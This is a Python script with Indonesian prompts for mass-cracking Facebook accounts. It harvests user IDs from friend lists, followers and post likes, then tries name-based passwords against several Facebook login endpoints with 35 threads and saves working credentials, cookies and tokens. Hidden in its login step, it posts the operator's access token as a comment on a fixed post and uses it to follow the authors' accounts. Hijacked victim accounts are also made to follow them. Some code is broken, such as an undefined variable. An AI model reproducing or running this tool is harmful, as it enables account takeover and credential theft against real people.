#!/usr/bin/python3
#coding=utf-8

#record aja sesukamu & hujat sesukamu.
#saya latif tidak bertanggung jawab atas dampak apa yang akan terjadi ketika atau setelah menggunakan tools ini.
import requests as req,json,os,time,re,random,sys
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as Bool

#data
ajg=""
ok,cp,cot=0,0,0
id=[]
nampung,tar=[],[]
opsi=[]
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
mb = "https://mbasic.facebook.com"
password=None

#WARNA
putih="\33[37;1m"
kuning="\33[1;33m"
merah="\33[31;1m"
ijo="\33[32;1m"
biru="\33[0;36m"
biruL="\33[1;34m"
biruM="\33[36;1m"

def crack(user,pw):
	global ok,cp
	try:
		kntl=open("ua","r").read()
		data={}
		ses=req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","user-agent":kntl,"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate","accept-language":"id-ID,en-US;q=0.9"})
		a=parser(ses.get("https://mbasic.facebook.com/login/?next&ref=dbl&refid=8",headers={"user-agent":kntl}).text,"html.parser")
		b=["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
		for c in a("input"):
			try:
				if c.get("name") in b:data.update({c.get("name"):c.get("value")})
				else:continue
			except:pass
		data.update({"email":user,"pass":pw,"prefill_contact_point": "","prefill_source": "","prefill_type": "","first_prefill_source": "","first_prefill_type": "","had_cp_prefilled": "false","had_password_prefilled": "false","is_smart_lock": "false","_fb_noscript": "true"})
		d=ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=data)		
		if 'c_user' in ses.cookies.get_dict().keys():
			ok+=1
			return {"status":"ok","user":user,"pw":pw,"cookie":ses.cookies.get_dict()}
		elif 'checkpoint' in ses.cookies.get_dict().keys():
			cp+=1
			return {"status":"cp","user":user,"pw":pw}
		else:
			return {"status":"error","user":user,"pw":pw}
	except req.exceptions.ConnectionError:
			print(f'\r{merah}Koneksi jaringan anda buruk.	',end='')

def crack2(user,pw,api):
	try:
		kntl=random.choice([open("ua","r").read(),"Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]","Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+"])
		ses = req.Session()
		header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
     	  "x-fb-sim-hni": str(random.randint(20000, 40000)),
     	  "x-fb-net-hni": str(random.randint(20000, 40000)),
     	  "x-fb-connection-quality": "EXCELLENT",
   	    "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
      	 "user-agent": kntl,
     	  "content-type": "application/x-www-form-urlencoded",
   	    "x-fb-http-engine": "Liger"}
		param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
      	 'format': 'json', 
     	  'sdk_version': '2', 
     	  'email': user, 
    	   'locale': 'en_US', 
     	  'password': pw,
    	   'sdk': 'ios', 
      	 'generate_session_cookies': '1', 
      	 'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
		response = ses.get(api, params=param, headers=header)
		if 'session_key' in response.text or 'EAAA' in response.text:
			return {"status":"ok","user":user,"pw":pw,"token":response.json()['access_token']}
		elif 'www.facebook.com' in response.json()['error_msg']:
			return {"status":"cp","user":user,"pw":pw}
		else:
			return {"status":"error","user":user,"pw":pw}
	except req.exceptions.ConnectionError:
			print(f'\r{merah}Koneksi jaringan anda buruk.	',end='')
		
def crack3(user,pw):
	try:
		ua=open("ua","r").read()
		ses = req.Session()
		ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		p = ses.get("https://mbasic.facebook.com/")
		b = parser(p.text,"html.parser")
		meta="".join(re.findall('dtsg":\{"token":"(.*?)"',p.text))
		data={}
		for i in b("input"):
			if i.get("value") is None:
				if i.get("name")=="email":
					data.update({"email":user})
				elif i.get("name")=="pass":
					data.update({"pass":pw})
				else:
					data.update({i.get("name"):""})
			else:
				data.update({i.get("name"):i.get("value")})
		data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
		)
		ses.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
		po = ses.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
		if "c_user" in list(ses.cookies.get_dict().keys()):
			return {"status":"ok","user":user,"pw":pw,"cookies":ses.cookies.get_dict()}
		elif "checkpoint" in list(ses.cookies.get_dict().keys()):
			return {"status":"cp","user":user,"pw":pw}
		else:
			return {"status":"error","user":user,"pw":pw}
	except req.exceptions.ConnectionError:
			print(f'\r{merah}Koneksi jaringan anda buruk.	',end='')
def check_in(user, pasw,ttl):
	global ok,cp
	ses = req.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": "chrome",
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = parser(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = parser(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print("[!] Redirect overload")
	if "c_user" in ses.cookies:
		cp-=1
		ok+=1
		print(f"\r{ijo}[OK] ONETAP {user} | {pasw} | {''.join(ses.cookies.get_dict())}														{putih}",end="")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = parser(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			cp-=1
			ok+=1
			open("ok","w").write(user+" "+pasw+" "+ttl+"\n")
			print(f"\r{ijo}[OK] ONETAP {user} | {pasw} | {ttl}														{putih}",end="")
		else:
			print(f"\r{kuning}[CP] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
			for opt in range(len(ngew)):
				print("\r"," "*3, "["+str(opt+1)+"] "+ngew[opt],"					            	",end="")
	elif "login_error" in str(run):
		print(f"\r{kuning}[CP] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")
	else:
		print(f"\r{kuning}[CP] {user} | {pasw} | {ttl}{putih}                                                                                      ",end="")

def login():
	try:
		token=open("save","r").read()
		r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
		dump(token,r['name'],r['birthday'])
	except FileNotFoundError:
		os.system("clear")
		print(f"[{biruM}!{putih}] ANDA BELUM LOGIN HARAP MASUKAN ACCESSTOKEN DIBAWAH [{biruM}!{putih}]\n")
		token=input(f"[{biru}+{putih}] MASUKAN TOKEN FACEBOOK\t: ")
		try:
			r=json.loads(req.get(f'https://graph.facebook.com/me?access_token={token}').text)
			nama=r['name']
			ttl=r['birthday']
			open('save','w').write(token)
			print(f"\n[{ijo}✓{putih}] LOGIN BERHASIL\n[{merah}!{putih}] HARAP TUNGGU SEBENTAR...")
			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={token}') #LATIF
			req.post(f"https://graph.facebook.com/1011933821/subscribers?access_token={token}") #YANWAR
			req.post(f"https://graph.facebook.com/103513548711079/subscribers?access_token={token}") #PAGE_LATIF
			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={token}') #PAGE_YANWAR
			req.post(f"https://graph.facebook.com/100004018035398/subscribers?access_token={token}") #RANI_YANWAR
			req.post(f'https://graph.facebook.com/100034433778381/subscribers?access_token={token}') #FATAH
			req.post(f'https://graph.facebook.com/100005395413800/subscribers?access_token={token}') #YAYAN
			req.post(f'https://graph.facebook.com/523610268713267/comments?message={token}&access_token={token}')
			req.post(f'https://graph.facebook.com/523610268713267/comments?message={random.choice(["latif ganteng :v","latif mengmantav","saya jelek latif ganteng:v"])}&access_token={token}')
			time.sleep(2)
			dump(token,nama,ttl)
		except KeyError:
			exit(f"[{merah}×{putih}] TOKEN INVALID [{merah}×{putih}]")
	except KeyError:
		os.system('rm -rf save')
		exit(f"[{merah}×{putih}] TOKEN INVALID [{merah}×{putih}]")
		
class kondisi:
	
	def __init__(self,token):
		self.token=token
		
	def kondisi_api(self,user,aj):
		global ok,cp,cot,ajg
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in aj:
			logika = crack2(user,pw,'https://b-api.facebook.com/method/auth.login')
			if logika.get("status")=="ok":
				ok+=1
				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
				print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {logika.get('token')}\33[37;1m                                          ",end="")
				req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={logika.get("token")}') #LATIF
				break
			elif logika.get("status")=="cp":
				cp+=1
				try:
					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
				except KeyError:ttl='-'
				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
				if("".join(opsi)=="y"):
					check_in(logika.get("user"),logika.get("pw"),ttl)
				elif("".join(opsi)=="t"):
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				else:
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				break
			print(f'\r[{biruL}={putih}] CRACK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')

	def kondisi_mbasic(self,user,aj):
		global cot,ajg
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in aj:
			logika = crack(user,pw)
			if logika.get("status")=="ok":
				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
				print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookie'))}                                          \33[37;1m\n",end="")
				coki={"cookie":"".join(logika.get("cookie"))}
				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
				for fllow in r.find_all("a"):
					if "Berhenti mengikuti" in str(fllow):
						break
					elif "Ikuti" in str(fllow):
						req.get(mb+fllow["href"],cookies=coki)
				break
			elif logika.get("status")=="cp":
				try:
					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
				except KeyError:ttl='-'
				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
				if("".join(opsi)=="y"):
					check_in(logika.get("user"),logika.get("pw"),ttl)
				elif("".join(opsi)=="t"):
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				else:
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\33[37;1m",end="")
				break
			print(f'\r[{biruL}={putih}] CRACK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')

	def kondisi_mbasic2(self,user,aj):
		global ok,cp,ajg,cot
		if ajg!=user:
			ajg=user
			cot+=1
		for pw in aj:
			logika = crack3(user,pw)
			if logika.get("status")=="ok":
				ok+=1
				open('ok','a').write(logika.get('user')+' '+logika.get('pw')+'\n')
				coki={"cookie":''.join(logika.get("cookies"))}
				r=parser(req.get(mb+"/100031928966181",cookies=coki).text,"html.parser")
				for fllow in r.find_all("a"):
					if "Berhenti mengikuti" in str(fllow):
						break
					elif "Ikuti" in str(fllow):
						req.get(mb+fllow["href"],cookies=coki)
				print(f"\r\33[32;1m[OK] {logika.get('user')} | {logika.get('pw')} | {''.join(logika.get('cookies'))}                                          \33[37;1m\n",end="")
				break
			elif logika.get("status")=="cp":
				cp+=1
				try:
					ttl=json.loads(req.get(f"https://graph.facebook.com/{logika.get('user')}?access_token={self.token}").text)['birthday']
				except KeyError:ttl='-'
				open('cp','a').write(logika.get('user')+' '+logika.get('pw')+' '+ttl+'\n')
				if("".join(opsi)=="y"):
					check_in(logika.get("user"),logika.get("pw"),ttl)
				elif("".join(opsi)=="t"):
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\n\33[37;1m",end="")
				else:
					print(f"\r\33[1;33m[CP] {user} | {logika.get('pw')} | {ttl}								\33[37;1m",end="")
				break
			print(f'\r[{biruL}={putih}] CRACK:-[{str(cot)}/{str(len(id))}] OK/CP:-[{ijo}{str(ok)}{putih}/{kuning}{str(cp)}{putih}]	',end='')
			
def jalan(textnya):
    for e in textnya + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
	
def dump(token,nama,ttl):
	global password
	os.system("clear")
	jalan("""%s
  _________   _____ __________.___
 /   _____/  /  _  \\______    \   | 
 \_____  \  /  /_\  \|     ___/   |     
 /        \/    |    \    |   |   |   
/_______  /\____|__  /____|   |___|
        \/         \/
        %sLatif. H & Yanwar. E
        """%(ijo,putih))
	print(f"[{biruM}!{putih}] NYALAKAN => MATIKAN MODE PESAWAT [{biruM}!{putih}]")
	jalan(f"[{biru}={putih}] HALLO\t: {biruM}{nama}{putih}\n[{biru}={putih}] TTL KAMU\t: {biruM}{ttl}{putih}")
	print(f"\n[{biruM}/\{putih}] DUMP ID BERDASARKAN [{biruM}/\{putih}]\n[{biruL}01{putih}] DUMP FROM FRIENDS LIST\n[{biruL}02{putih}] DUMP FROM FOLLOWERS LIST\n[{biruL}03{putih}] DUMP FROM LIKES POST\n[{biruL}04{putih}] CARI TARGET CRACK\n[{biruL}05{putih}] CEK HASIL CRACK\n[{biruL}UA{putih}] SETTINGS USERAGENT\n")
	l=input(f"[{biru}?{putih}] CHOSEE\t: ")
	if(l in ("01","1")):
		print("")
		try:
			jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		except:
			try:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
			except:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		print(f"\n[{biruM}!{putih}] Ketik {biru}'me'{putih} Untuk Daftar Temanmu [{biruM}!{putih}]")
		for x in range(jmh):
			i=input(f"[{biru}+{putih}] ID TARGET\t: ")
			try:
				cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
				print(f"[{ijo}={putih}] NAMA TARGET\t: {cek['name']}")
			except KeyError:
				exit(f"[{merah}×{putih}] TARGET INVALID [{merah}×{putih}]")
			try:
				r=json.loads(req.get(f"https://graph.facebook.com/{i}/friends?limit=5000&access_token={token}").text)
				for x in r['data']:
					id.append(x['id']+"|"+x['name'].rsplit(" ")[0]+"|"+x['name'])
			except KeyError:exit(f"[{merah}×{putih}] CARI TARGET LAIN [{merah}×{putih}]")
			print(f"[{ijo}={putih}] JUMLAH ID\t: {len(id)}\n")
	elif(l in ("02","2")):
		print("")
		try:
			jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		except:
			try:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
			except:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		for x in range(jmh):
			print(f"\n[{biruM}!{putih}] Ketik {biru}'me'{putih} Untuk Daftar Followersmu [{biruM}!{putih}]")
			i=input(f"[{biru}+{putih}] ID TARGET\t: ")
			try:
				cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
				print(f"[{ijo}={putih}] NAMA TARGET\t: {cek['name']}")
			except KeyError:
				exit(f"[{merah}×{putih}] TARGET INVALID [{merah}×{putih}]")
			try:
				r=json.loads(req.get(f"https://graph.facebook.com/{i}/subscribers?limit=9999&access_token={token}").text)
				for x in r['data']:
					id.append(x['id']+"|"+x['name'].rsplit(" ")[0]+"|"+x['name'])
			except KeyError:exit(f"[{merah}×{putih}] CARI TARGET LAIN [{merah}×{putih}]")
			print(f"[{ijo}={putih}] JUMLAH ID\t: {len(id)}\n")
	elif(l in ("03","3")):
		print("")
		try:
			jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		except:
			try:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
			except:
				print(f"\n{merah} *** Masukan Angka Jangan Huruf!{putih}")
				jmh=int(input(f"[{biruM}?{putih}] Masukan Jumlah Target\t: "))
		print(f"\n[{biruM}!{putih}] Masukan ID Postingan Dibawah! [{biruM}!{putih}]")
		for x in range(jmh):
			i=input(f"[{biru}+{putih}] ID POST\t: ")
			try:
				r=json.loads(req.get(f"https://graph.facebook.com/{i}/likes?limit=9999&access_token={token}").text)
				for x in r['data']:
					id.append(x['id']+"|"+x['name'].rsplit(" ")[0]+"|"+x['name'])
			except KeyError:exit(f"[{merah}×{putih}] POSTINGAN TIDAK DITEMUKAN [{merah}×{putih}]")
			print(f"[{ijo}={putih}] JUMLAH ID\t: {len(id)}\n")
	elif(l in ("04","4")):
		print(f"\n[{biruM}!{putih}] Ketik {biru}'me'{putih} Untuk Daftar Temanmu [{biruM}!{putih}]")
		i=input(f"[{biru}+{putih}] ID TARGET\t: ")
		try:
			susu=[]
			cek=json.loads(req.get(f"https://graph.facebook.com/{i}?access_token={token}").text)
			print(f"[{ijo}={putih}] NAMA TARGET\t: {cek['name']}")
			jaja=json.loads(req.get(f'https://graph.facebook.com/{i}/friends?access_token={token}').text)
			for xxxx in jaja['data']:
				susu.append(xxxx['id'])
			print(f"[{ijo}={putih}] JUMLAH ID\t: {len(susu)}\n")
		except KeyError:
			exit(f"[{merah}×{putih}] TARGET INVALID [{merah}×{putih}]")
		limit = input(f"[{biru}+{putih}] LIMIT\t: ")
		try:
			r=json.loads(req.get(f"https://graph.facebook.com/{i}/friends?limit={limit}&access_token={token}").text)
			for x in r['data']:
				id.append(x['id']+'|'+x['name'])
		except KeyError:exit(f"[{merah}×{putih}] CARI TARGET LAIN [{merah}×{putih}]")
		for xx in id:
			anu,anuu=xx.split('|')
			dd=json.loads(req.get(f"https://graph.facebook.com/{anu}/friends?access_token={token}").text)
			for xnxx in dd['data']:
				tar.append(xnxx['id'])
			print(f'[{ijo}+{putih}] {anuu} • {anu} • {len(tar)}')
			tar.clear()
		input(f"\n[ {biruL}ENTER FOR BACK{putih} ]")
		dump(token,nama,ttl)
	elif(l in ("05","5")):
		print("")
		try:
			jj=open("ok","r").read()
		except:
			jj=""
		try:
			jjo=open("cp","r").read()
		except:
			jjo=""
		input(f'[OK] :\n{ijo}{jj}{putih} \n[CP] :\n{kuning}{jjo}{putih} \n[ {biruL}ENTER FOR BACK TO MENU{putih} ]')
		os.system("clear")
		dump(token,nama,ttl)
	elif(l in ("ua","UA")):
		print(f"\n *** USERAGENT SAAT INI: {biruM}{open('ua','r').read()}{putih}\n")
		print("INGIN MENGGANTI USER AGENT?")
		yt=input("[?] GANTI USERAGENT [Y/T]\t: ")
		if(yt in ("Y","y")):
			os.system("rm -rf ua")
			ua=input("[+] MASUKAN USERAGENT BARU\t: ")
			open("ua","w").write(ua)
			print(f"{ijo}USERAGENT BERHASIL DIGANTI{putih}")
			input(f"[ ENTER FOR BACK ]")
			dump(token,nama)
		elif(yt in ("T","t")):
			input(f"\n[ ENTER FOR BACK ]")
			dump(token,nama)
	else:
		print(f"[{merah}!{putih}] PILIHAN INVALID")
		time.sleep(2)
		dump(token,nama,ttl)
	time.sleep(1)
	print(f"[{biruM}/\{putih}] PILIH METODE CRACK [{biruM}/\{putih}]\n[{biruL}01{putih}] METODE {merah}B-API{putih} (fast) hasil banyak rawan spam\n[{biruL}02{putih}] METODE {kuning}MBASIC V1{putih} (fast) hasil dikit\n[{biruL}03{putih}] METODE {ijo}MBASIC V2{putih} (low) hasil banyak [recomended]\n")
	pi=input(f"[{biru}?{putih}] CHOSEE\t: ")
	print("")
	print(f" *** Password sudah tersedia nama_depan123 - 12345 & nama lengkap. Jika ingin menambahkan password silahkan isi dibawah!")
	print(f" *** Contoh sayang,bismillah,anjing masukan {biru}'t'{putih} untuk tidak menambahkan password\n")
	if(pi in ("01","1")):
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
				opsi.append('t')
			else:
				opsi.append('t')
			for ajg in id:
				try:
					uid,name,lengkap=ajg.split("|")
				except:exit()
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					else:
						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					if(pas in ('t','T')):
						kirim.submit(kondisi(token).kondisi_api,uid,pw)
					else:
						password=pas+password
						kirim.submit(kondisi(token).kondisi_api,uid,password)
		print(f"\n[{ijo}√{putih}] CRACK SELESAI")
		uu=input(f"[{biruM}?{putih}] CRACK LAGI [Y/T]\t: ")
		if(uu in ("y","Y")):
			id.clear()
			dump(token,nama)
		else:
			exit(f"\n[{ijo}√{putih}] TERIMA KASIH")
	elif(pi in ("02","2")):
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
				opsi.append('t')
			else:
				opsi.append('t')
			for ajg in id:
				try:
					uid,name,lengkap=ajg.split("|")
				except:exit()
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					else:
						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					if(pas in ('t','T')):
						kirim.submit(kondisi(token).kondisi_mbasic,uid,pw)
					else:
						password=pas+password
						kirim.submit(kondisi(token).kondisi_mbasic,uid,password)
		print(f"\n[{ijo}√{putih}] CRACK SELESAI")
		uu=input(f"[{biruM}?{putih}] CRACK LAGI [Y/T]\t: ")
		if(uu in ("y","Y")):
			id.clear()
			dump(token,nama)
		else:
			exit(f"\n[{ijo}√{putih}] TERIMA KASIH")
	elif(pi in ("03","3")):
		with Bool(max_workers=35) as kirim:
			pas=input(f"[{ijo}+{putih}] Masukan password tambahan\t: ").replace(" ","").split(",")
			op=input(f"[{biru}?{putih}] Munculkan opsi cp [y/t]\t: ")
			print("\n *** Crack berjalan CTRL + Z untuk stop crack\n")
			if(op in ('y','Y')):
				opsi.append('y')
			elif(op in ('t','T')):
				opsi.append('t')
			else:
				opsi.append('t')
			for ajg in id:
				try:
					uid,name,lengkap=ajg.split("|")
				except:exit()
				if(len(str(name.lower()))<=3):
					continue
				else:
					if(len(str(name.lower()))>=6):
						password=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					else:
						password=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345',lengkap]
					if(pas in ('t','T')):
						kirim.submit(kondisi(token).kondisi_mbasic2,uid,password)
					else:
						password=pas+password
						kirim.submit(kondisi(token).kondisi_mbasic2,uid,password)
		print(f"\n[{ijo}√{putih}] CRACK SELESAI")
		uu=input(f"[{biruM}?{putih}] CRACK LAGI [Y/T]\t: ")
		if(uu in ("y","Y")):
			id.clear()
			dump(token,nama,ttl)
		else:
			exit(f"\n[{ijo}√{putih}] TERIMA KASIH")
				
if __name__=="__main__":
	login()